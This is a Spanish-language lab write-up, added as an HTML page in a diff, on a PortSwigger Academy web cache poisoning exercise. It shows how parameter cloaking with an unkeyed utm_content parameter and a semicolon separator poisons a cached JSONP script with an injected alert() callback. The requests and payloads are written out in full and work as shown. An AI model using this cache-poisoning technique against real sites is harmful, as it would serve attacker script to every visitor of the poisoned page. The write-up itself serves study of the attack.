@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Sacamos con el param miner que el parámetro por GET : utm_content es unkeyed.&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Sacamos con el param miner que el parámetro por GET : utm_content es unkeyed.</p>
+
+<p>Cuando enviamos :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?utm_content=xss&amp;cb=1234
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: utm_content=xss;
+</code></pre></div></div>
+
+<p>Observamos que en <code class="language-plaintext highlighter-rouge">GET /js/geolocate.js</code> podemos controlar el parámetro callback que se refleja en :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">setCountryCookie</span> <span class="o">=</span> <span class="p">(</span><span class="nx">country</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">country=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">country</span><span class="p">;</span> <span class="p">};</span>
+<span class="kd">const</span> <span class="nx">setLangCookie</span> <span class="o">=</span> <span class="p">(</span><span class="nx">lang</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">lang=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">lang</span><span class="p">;</span> <span class="p">};</span>
+<span class="nc">AQUÍ</span><span class="p">({</span><span class="dl">"</span><span class="s2">country</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">United Kingdom</span><span class="dl">"</span><span class="p">});</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">GET /js/geolocate.js?callback=alert()//</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">setCountryCookie</span> <span class="o">=</span> <span class="p">(</span><span class="nx">country</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">country=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">country</span><span class="p">;</span> <span class="p">};</span>
+<span class="kd">const</span> <span class="nx">setLangCookie</span> <span class="o">=</span> <span class="p">(</span><span class="nx">lang</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">lang=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">lang</span><span class="p">;</span> <span class="p">};</span>
+<span class="nf">alert</span><span class="p">()</span><span class="c1">//({"country":"United Kingdom"});</span>
+</code></pre></div></div>
+
+<p>La cosa es que cachear la request de arriba no nos vale para hacer que la víctima ejecuta la alerta, porque la víctima no va a cargar una respuesta cacheada si no hace una solicitud a <code class="language-plaintext highlighter-rouge">GET /js/geolocate.js?callback=alert()//</code></p>
+
+<h3 id="podemos-usar-find-rails-param-cloacking-scanner">Podemos usar find <strong>rails param cloacking scanner</strong></h3>
+
+<p>Que nos automatiza buscar parámetros parseados de distinta forma entre la caché y el backend.</p>
+
+<p>Nos ha encontrado que si hacemos :</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET /?utm_content=oxwyy8&amp;utm_content=x;oxwyy8=akzldka&amp;r3zxm7258=1
+</span></code></pre></div></div>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET /?utm_content=oxwyy8&amp;r3zxm7258=1
+</span></code></pre></div></div>
+
+<pre><code class="language-HTML">HIT
+
+&lt;link rel="canonical" href='//0ac4005e03a5a787803af3fa00a50045.web-security-academy.net/?utm_content=oxwyy8&amp;amp;utm_content=x;oxwyy8=akzldka&amp;amp;r3zxm7258=1'/&gt;
+</code></pre>
+
+<p>Es decir que si pones dos utm_content no se incluyen los dos en la cache key y a continuación probaremos también que oxwyy8 se interpretará como otro argumento de la url por el backend</p>
+
+<p>Asi que</p>
+
+<p>`GET /js/geolocate.js?callback=setCountryCookie&amp;utm_content=x;callback=alert()//</p>
+
+<p>Nos devolverá</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">setCountryCookie</span> <span class="o">=</span> <span class="p">(</span><span class="nx">country</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">country=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">country</span><span class="p">;</span> <span class="p">};</span>
+<span class="kd">const</span> <span class="nx">setLangCookie</span> <span class="o">=</span> <span class="p">(</span><span class="nx">lang</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">lang=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">lang</span><span class="p">;</span> <span class="p">};</span>
+<span class="nf">alert</span><span class="p">()</span><span class="c1">//({"country":"United Kingdom"});</span>
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
